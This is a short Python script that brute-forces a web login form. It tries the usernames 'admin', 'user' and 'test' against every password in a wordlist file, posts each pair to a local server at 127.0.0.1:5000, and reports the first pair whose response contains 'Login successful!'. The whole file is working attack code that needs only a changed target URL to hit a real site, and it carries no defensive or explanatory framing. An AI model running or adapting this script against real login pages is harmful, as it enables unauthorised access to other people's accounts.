# webLoginBruteForce.py
import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Login successful!"

for username in usernames:
	with open (passwords, "r") as password_list:
		for password in password_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {} {}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"Username": username, "Password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for {}".format(username))
		sys.stdout.write("\n")
